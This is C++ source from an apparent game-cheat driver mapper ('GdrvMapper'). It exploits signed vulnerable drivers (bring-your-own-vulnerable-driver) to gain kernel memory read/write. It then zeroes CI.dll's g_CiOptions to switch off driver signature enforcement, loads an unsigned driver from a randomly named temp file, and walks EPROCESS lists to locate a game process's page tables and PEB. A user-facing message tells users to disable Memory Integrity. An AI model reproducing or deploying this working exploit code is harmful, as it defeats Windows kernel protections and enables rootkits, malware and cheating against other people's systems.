    auto NtQSI = (NtQuerySystemInformation_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return false;

    struct { ULONG Length; ULONG CodeIntegrityOptions; } ci = {};
    ci.Length = sizeof(ci);
    NTSTATUS st = NtQSI(103 /*SystemCodeIntegrityInformation*/, &ci, sizeof(ci), nullptr);
    if (st >= 0) {
        // 0x400 = CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED
        if (ci.CodeIntegrityOptions & 0x400) return true;
    }

    // Fallback: check DeviceGuard runtime status
    DWORD vbsStatus = 0, sz = sizeof(vbsStatus);
    if (RegGetValueA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
        "VirtualizationBasedSecurityStatus",
        RRF_RT_DWORD, nullptr, &vbsStatus, &sz) == ERROR_SUCCESS) {
        if (vbsStatus == 2) return true; // 2 = VBS running
    }

    return false;
}

// ── Main loader — tries all backends in order ───────────────────────────
// CI bypass: g_CiOptions=0 is the primary (and normally only) mechanism.
// The original CI validation functions check g_CiOptions and return
// STATUS_SUCCESS on their own when it's 0. No code patching, no PTE
// remap, no SeCiCallbacks swap needed on modern Windows.

static bool LoadDriverWithCIBypass(
    const uint8_t* targetDriverData,
    size_t targetDriverSize,
    const wchar_t* targetDriverFilename,
    std::string& statusOut)
{
    if (IsHVCIRunning()) {
        statusOut = "HVCI_ACTIVE: Memory Integrity (HVCI) is running — kernel R/W blocked by hypervisor. Disable Memory Integrity in Windows Security and restart.";
        return false;
    }

    if (!EnableLoadDriverPrivilege()) {
        statusOut = "Failed to acquire SeLoadDriverPrivilege — run as admin";
        return false;
    }

    ULONG_PTR kBase = GetKernelModuleAddress("ntoskrnl.exe");
    if (!kBase) {
        statusOut = "Failed to resolve ntoskrnl base — run as admin";
        return false;
    }

    std::wstring randName = RandomTempName(L".sys");
    std::wstring targetPath = DropToTemp(targetDriverData, targetDriverSize, randName.c_str());
    if (targetPath.empty()) {
        statusOut = "Failed to extract target driver to temp";
        return false;
    }

    std::wstring targetSvcKey;
    if (!CreateDriverService(targetPath, targetSvcKey)) {
        DeleteFileW(targetPath.c_str());
        statusOut = "Failed to create target driver service registry entry";
        return false;
    }

    VulnDriverState vulnState = {};
    std::string allFailures;
    for (int di = 0; di < g_numVulnDrivers; di++) {
        std::string failReason;
        vulnState = TryVulnDriver(g_vulnDrivers[di], (DWORD64)kBase, failReason);
        if (vulnState.krw.type != KernelRW::Backend::NONE) break;
        if (!allFailures.empty()) allFailures += "; ";
        allFailures += failReason;
    }

    if (vulnState.krw.type == KernelRW::Backend::NONE) {
        DeleteDriverService(targetSvcKey);
        DeleteFileW(targetPath.c_str());
        statusOut = "All vulnerable driver backends failed: " + allFailures;
        return false;
    }

    std::string ciDiag;
    char tmp[256];
    sprintf_s(tmp, "backend=%s", vulnState.backendName);
    ciDiag += tmp;

    // ── Step 1: Find g_CiOptions ──
    ULONG_PTR kCiBase = GetKernelModuleAddress("CI.dll");
    DWORD64 ciOptionsAddr = 0;
    if (kCiBase) {
        ciOptionsAddr = FindCiOptions(kCiBase, vulnState.krw, ciDiag);
    } else {
        ciDiag += " | CI.dll:kBase=0";
    }

    // ── Step 2: Zero g_CiOptions ──
    DWORD64 origCiOptQword = 0;
    DWORD origVal = 0;
    bool ciOptNeedRestore = false;

    if (ciOptionsAddr) {
        origCiOptQword = KernelRW::Read64(vulnState.krw, ciOptionsAddr);
        origVal = (DWORD)(origCiOptQword & 0xFFFFFFFF);

        if (origVal == 0) {
            ciDiag += " | ciOpt=0(already-off)";
        } else {
            DWORD64 patched = origCiOptQword & 0xFFFFFFFF00000000ULL;
            KernelRW::Write64(vulnState.krw, ciOptionsAddr, patched);
            DWORD64 verify = KernelRW::Read64(vulnState.krw, ciOptionsAddr);
            DWORD verifyVal = (DWORD)(verify & 0xFFFFFFFF);

            if (verifyVal == 0) {
                ciOptNeedRestore = true;
                sprintf_s(tmp, " | ciOpt:%u->0(OK)", origVal);
                ciDiag += tmp;
            } else {
                sprintf_s(tmp, " | ciOpt:%u->%u(WRITE-FAIL)", origVal, verifyVal);
                ciDiag += tmp;
                CleanupVulnDriver(vulnState);
                DeleteDriverService(targetSvcKey);
                DeleteFileW(targetPath.c_str());
                statusOut = "CI bypass: g_CiOptions write failed [" + ciDiag + "]";
                return false;
            }
        }
    } else {
        ciDiag += " | ciOpt:NOT-FOUND";
    }

    // ── Step 3: Load the driver (5 attempts with drift detection) ──
    NTSTATUS targetSt = (NTSTATUS)0xC0000428L;

    for (int attempt = 0; attempt < 5; attempt++) {
        if (ciOptionsAddr) {
            DWORD64 check = KernelRW::Read64(vulnState.krw, ciOptionsAddr);
            DWORD curVal = (DWORD)(check & 0xFFFFFFFF);
            if (curVal != 0) {
                sprintf_s(tmp, " | drift:a%d(%u->re-zero)", attempt, curVal);
                ciDiag += tmp;
                KernelRW::Write64(vulnState.krw, ciOptionsAddr,
                    check & 0xFFFFFFFF00000000ULL);
                DWORD64 v2 = KernelRW::Read64(vulnState.krw, ciOptionsAddr);
                if ((DWORD)(v2 & 0xFFFFFFFF) != 0) {
                    ciDiag += " | drift:re-zero-FAIL";
                    continue;
                }
            }
        }

        targetSt = NtLoadDriverWrapper(targetSvcKey);

        sprintf_s(tmp, " | a%d=0x%08X", attempt, (unsigned)targetSt);
        ciDiag += tmp;

        if (targetSt >= 0) break;
        if (targetSt != (NTSTATUS)0xC0000428L) break;

        if (attempt < 4) Sleep(50);
    }

    // ── Step 4: Restore g_CiOptions ──
    if (ciOptNeedRestore && ciOptionsAddr) {
        bool restored = false;
        for (int ri = 0; ri < 3; ri++) {
            KernelRW::Write64(vulnState.krw, ciOptionsAddr, origCiOptQword);
            DWORD64 verify = KernelRW::Read64(vulnState.krw, ciOptionsAddr);
            if (verify == origCiOptQword) { restored = true; break; }
            Sleep(10);
        }
        DWORD64 finalVal = KernelRW::Read64(vulnState.krw, ciOptionsAddr);
        sprintf_s(tmp, " | ciRestore:%s(now=%u)",
            restored ? "OK" : "FAIL", (unsigned)(finalVal & 0xFFFFFFFF));
        ciDiag += tmp;
    }

    // ── Step 5: Cleanup ──
    CleanupVulnDriver(vulnState);
    DeleteDriverService(targetSvcKey);
    DeleteFileW(targetPath.c_str());

    if (targetSt < 0) {
        char hex[16];
        sprintf_s(hex, "%08X", (unsigned)targetSt);
        statusOut = "CI bypass: NtLoadDriver=0x" + std::string(hex) +
            " ciOpt(was=" + std::to_string(origVal) + ") [" + ciDiag + "]";
        return false;
    }

    char okBuf[1024];
    sprintf_s(okBuf, "Driver loaded OK (%s) ciOpt(was=%u) [%s]",
        vulnState.backendName, origVal, ciDiag.c_str());
    statusOut = okBuf;
    return true;
}

// ============================================================================
// EPROCESS walking — find game process via kernel structures
// Build-aware offsets with brute-force fallback for unknown builds
// ============================================================================

static constexpr DWORD64 EPROC_DTB   = 0x028; // KPROCESS.DirectoryTableBase (stable across all builds)
static constexpr DWORD64 PEB_IMAGEBASE = 0x10; // PEB.ImageBaseAddress (x64)

// Runtime-discovered offsets (set by DiscoverEprocOffsets or defaults)
inline DWORD64 g_eprocPid   = 0x440;
inline DWORD64 g_eprocLinks = 0x448;
inline DWORD64 g_eprocPeb   = 0x550;
inline bool    g_eprocOffsetsDiscovered = false;

static DWORD64 FindKernelExport(DWORD64 kBase, const char* funcName) {
    HMODULE hLocal = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hLocal) return 0;
    FARPROC proc = GetProcAddress(hLocal, funcName);
    if (!proc) { FreeLibrary(hLocal); return 0; }
    DWORD64 rva = (DWORD64)((ULONG_PTR)proc - (ULONG_PTR)hLocal);
    FreeLibrary(hLocal);
    return kBase + rva;
}

// Walk ActiveProcessLinks using the given offsets to find a target PID
static DWORD64 WalkEPROCESS(const KernelRW::Context& sysCtx, DWORD64 systemEproc,
                             DWORD64 pidOff, DWORD64 linksOff, DWORD targetPid) {
    DWORD64 current = systemEproc;
    for (int i = 0; i < 2000; i++) {
        DWORD64 pid = KernelRW::Read64(sysCtx, current + pidOff);
        if ((DWORD)pid == targetPid) return current;

        DWORD64 flink = KernelRW::Read64(sysCtx, current + linksOff);
        if (!flink || flink < 0xFFFF800000000000ULL) break;

        DWORD64 next = flink - linksOff;
        if (next == systemEproc) break;
        current = next;
    }
    return 0;
}

// Brute-force discover EPROCESS offsets by scanning System process (PID 4)
static bool DiscoverEprocOffsets(const KernelRW::Context& sysCtx, DWORD64 systemEproc) {
    // Known offset tables for different builds
    struct OffsetSet { DWORD64 pid; DWORD64 links; DWORD64 peb; const char* label; };
    static const OffsetSet knownSets[] = {
        { 0x440, 0x448, 0x550, "Win10-20H1+/Win11-24H2" },
        { 0x448, 0x450, 0x558, "Win11-25H2-candidate-A" },
        { 0x438, 0x440, 0x548, "Win11-25H2-candidate-B" },
        { 0x450, 0x458, 0x560, "Win11-25H2-candidate-C" },
    };

    // Try known sets first — walk must find at least 5 processes to validate
    for (auto& s : knownSets) {
        DWORD64 pid0 = KernelRW::Read64(sysCtx, systemEproc + s.pid);
        if ((DWORD)pid0 != 4) continue; // System PID must be 4

        // Validate the links offset: walk a few entries and verify they look like kernel pointers
        DWORD64 flink = KernelRW::Read64(sysCtx, systemEproc + s.links);
        if (!flink || flink < 0xFFFF800000000000ULL) continue;
        DWORD64 next = flink - s.links;
        if (next == systemEproc) continue;

        // Walk a few more to confirm
        int validCount = 0;
        DWORD64 cur = next;
        for (int i = 0; i < 10 && cur != systemEproc; i++) {
            DWORD64 p = KernelRW::Read64(sysCtx, cur + s.pid);
            if (p > 0 && p < 100000) validCount++;
            DWORD64 fl = KernelRW::Read64(sysCtx, cur + s.links);
            if (!fl || fl < 0xFFFF800000000000ULL) break;
            cur = fl - s.links;
        }
        if (validCount >= 3) {
            g_eprocPid = s.pid;
            g_eprocLinks = s.links;
            g_eprocPeb = s.peb;
            g_eprocOffsetsDiscovered = true;
            {
                char msg[256]; sprintf_s(msg, "Offsets matched: %s (PID=0x%llX Links=0x%llX Peb=0x%llX)",
                    s.label, (unsigned long long)s.pid, (unsigned long long)s.links, (unsigned long long)s.peb);
                Logger::Log("EPROC", msg);
            }
            return true;
        }
    }

    // Brute-force scan: search system EPROCESS for value 4 (System PID)
    Logger::Log("EPROC", "Known offsets failed, brute-force scanning system EPROCESS...");

    // First, dump what's at the known offsets to diagnose
    {
        const DWORD64 diagOffsets[] = { 0x028, 0x2E0, 0x2E8, 0x430, 0x438, 0x440, 0x448, 0x450, 0x458, 0x460, 0x468, 0x470, 0x478, 0x480, 0x488, 0x490 };
        char msg[256];
        for (auto doff : diagOffsets) {
            DWORD64 val = KernelRW::Read64(sysCtx, systemEproc + doff);
            sprintf_s(msg, "  [0x%03llX] = 0x%016llX (%llu)",
                (unsigned long long)doff, (unsigned long long)val, (unsigned long long)val);
            Logger::Log("EPROC", msg);
        }
    }

    // Wide scan: 0x080 to 0xB00 (covers all known and future offset ranges)
    for (DWORD64 off = 0x080; off < 0xB00; off += 8) {
        DWORD64 val = KernelRW::Read64(sysCtx, systemEproc + off);
        if ((DWORD)val != 4 || val > 0xFFFF) continue; // Must be exactly PID 4

        // Candidate PID offset found, check if off+8 is ActiveProcessLinks
        DWORD64 linksOff = off + 8;
        DWORD64 flink = KernelRW::Read64(sysCtx, systemEproc + linksOff);
        if (!flink || flink < 0xFFFF800000000000ULL) continue;

        DWORD64 next = flink - linksOff;
        if (next == systemEproc || next < 0xFFFF800000000000ULL) continue;

        // Validate: next process should have a reasonable PID
        DWORD64 nextPid = KernelRW::Read64(sysCtx, next + off);
        if (nextPid == 0 || nextPid > 100000) continue;

        // Walk a few more to confirm
        int validCount = 0;
        DWORD64 cur = next;
        for (int i = 0; i < 10 && cur != systemEproc; i++) {
            DWORD64 p = KernelRW::Read64(sysCtx, cur + off);
            if (p > 0 && p < 100000) validCount++;
            DWORD64 fl = KernelRW::Read64(sysCtx, cur + linksOff);
            if (!fl || fl < 0xFFFF800000000000ULL) break;
            cur = fl - linksOff;
        }
        if (validCount >= 3) {
            g_eprocPid = off;
            g_eprocLinks = linksOff;
            g_eprocPeb = off + 0x110;
            g_eprocOffsetsDiscovered = true;
            {
                char msg[256]; sprintf_s(msg, "Brute-force found offsets: PID=0x%llX Links=0x%llX Peb=0x%llX (walked %d valid)",
                    (unsigned long long)off, (unsigned long long)linksOff,
                    (unsigned long long)(off + 0x110), validCount);
                Logger::Log("EPROC", msg);
            }
            return true;
        }
    }

    // If scan found nothing, dump a wider region to help diagnose
    {
        Logger::Log("EPROC", "Full scan 0x080-0xB00 failed. Dumping PID=4 candidates:");
        char msg[256];
        int candidates = 0;
        for (DWORD64 off = 0x080; off < 0xB00; off += 8) {
            DWORD64 val = KernelRW::Read64(sysCtx, systemEproc + off);
            if ((DWORD)val == 4) {
                sprintf_s(msg, "  PID=4 candidate at 0x%03llX (full=0x%016llX)",
                    (unsigned long long)off, (unsigned long long)val);
                Logger::Log("EPROC", msg);
                candidates++;
            }
        }
        if (candidates == 0)
            Logger::Log("EPROC", "  NO PID=4 value found anywhere in EPROCESS — reads may be failing");
    }

    Logger::Log("EPROC", "FAILED to discover offsets via known sets or brute-force");
    return false;
}

static DWORD64 FindEPROCESS(const KernelRW::Context& sysCtx, DWORD64 kBase, DWORD targetPid) {
    DWORD64 psInitAddr = FindKernelExport(kBase, "PsInitialSystemProcess");
    if (!psInitAddr) {
        Logger::Log("EPROC", "PsInitialSystemProcess export not found");
        return 0;
    }

    DWORD64 systemEproc = KernelRW::Read64(sysCtx, psInitAddr);
    if (!systemEproc || systemEproc < 0xFFFF800000000000ULL) {
        {
            char msg[128]; sprintf_s(msg, "System EPROCESS read failed: 0x%llX", (unsigned long long)systemEproc);
            Logger::Log("EPROC", msg);
        }
        return 0;
    }
    {
        char msg[128]; sprintf_s(msg, "System EPROCESS=0x%llX", (unsigned long long)systemEproc);
        Logger::Log("EPROC", msg);
    }

    // Discover offsets on first call
    if (!g_eprocOffsetsDiscovered) {
        DiscoverEprocOffsets(sysCtx, systemEproc);
    }

    return WalkEPROCESS(sysCtx, systemEproc, g_eprocPid, g_eprocLinks, targetPid);
}

static DWORD64 GetProcessCR3(const KernelRW::Context& sysCtx, DWORD64 eprocess) {
    return KernelRW::Read64(sysCtx, eprocess + EPROC_DTB);
}

static DWORD64 GetPebAddress(const KernelRW::Context& sysCtx, DWORD64 eprocess) {
    DWORD64 peb = KernelRW::Read64(sysCtx, eprocess + g_eprocPeb);
    if (peb > 0x10000 && peb < 0x7FFFFFFFFFFF) return peb;

    // Heuristic PEB offset failed — scan EPROCESS for a user-space page-aligned pointer
    // Search in the range where PEB typically lives (after ActiveProcessLinks)
    for (DWORD64 off = g_eprocLinks + 0x20; off < g_eprocLinks + 0x200; off += 8) {
        DWORD64 candidate = KernelRW::Read64(sysCtx, eprocess + off);
        if (candidate > 0x10000 && candidate < 0x7FFFFFFFFFFF && (candidate & 0xFFF) == 0) {
            g_eprocPeb = off;
            char msg[128]; sprintf_s(msg, "PEB offset discovered at 0x%llX (val=0x%llX)",
                (unsigned long long)off, (unsigned long long)candidate);
            Logger::Log("EPROC", msg);
            return candidate;
        }
    }
    return peb; // return whatever we got
}

// Read PEB.ImageBaseAddress through the game's own CR3 (user-space address)
static DWORD64 GetModuleBaseFromPEB(const KernelRW::Context& gameCtx, DWORD64 pebAddr) {
    if (!pebAddr || pebAddr > 0x7FFFFFFFFFFF) return 0;
    return KernelRW::ReadValue<DWORD64>(gameCtx, pebAddr + PEB_IMAGEBASE);
}

// Validate CR3 by reading the PE header MZ signature through it
static bool ValidateCR3(const KernelRW::Context& ctx, DWORD64 cr3, DWORD64 knownUserVA) {
    KernelRW::Context testCtx = KernelRW::MakeContextWithCR3(ctx, cr3);
    WORD mz = KernelRW::ReadValue<WORD>(testCtx, knownUserVA);
    return mz == 0x5A4D;
}

// ============================================================================
// BYOVD-only loader — no CI bypass, no unsigned driver
// Loads a signed vulnerable driver for physical memory access only.
// ============================================================================

static bool LoadBYOVDOnly(
    KernelRW::Context& outSysCtx,
    VulnDriverState& outVulnState,
    std::string& statusOut)
{
    if (!EnableLoadDriverPrivilege()) {
        statusOut = "Failed to acquire SeLoadDriverPrivilege — run as admin";
        return false;
    }

    ULONG_PTR kBase = GetKernelModuleAddress("ntoskrnl.exe");
    if (!kBase) {
        statusOut = "Failed to resolve ntoskrnl base — run as admin";
        return false;
    }

    std::string allFailures;
    outVulnState = {};

    for (int di = 0; di < g_numVulnDrivers; di++) {
        if (g_vulnDrivers[di].backend == KernelRW::Backend::GIO) continue;

        std::string failReason;
        outVulnState = TryVulnDriver(g_vulnDrivers[di], (DWORD64)kBase, failReason);
        if (outVulnState.krw.type != KernelRW::Backend::NONE) break;
        if (!allFailures.empty()) allFailures += "; ";
        allFailures += failReason;
    }

    if (outVulnState.krw.type == KernelRW::Backend::NONE) {
        statusOut = "No physical BYOVD backend available: " + allFailures;
        return false;
    }

    outSysCtx = outVulnState.krw;

    char buf[256];
    sprintf_s(buf, "BYOVD ready — backend=%s cr3=0x%llX",
        outVulnState.backendName,
        (unsigned long long)outSysCtx.cr3);
    statusOut = buf;
    return true;
}

} // namespace GdrvMapper
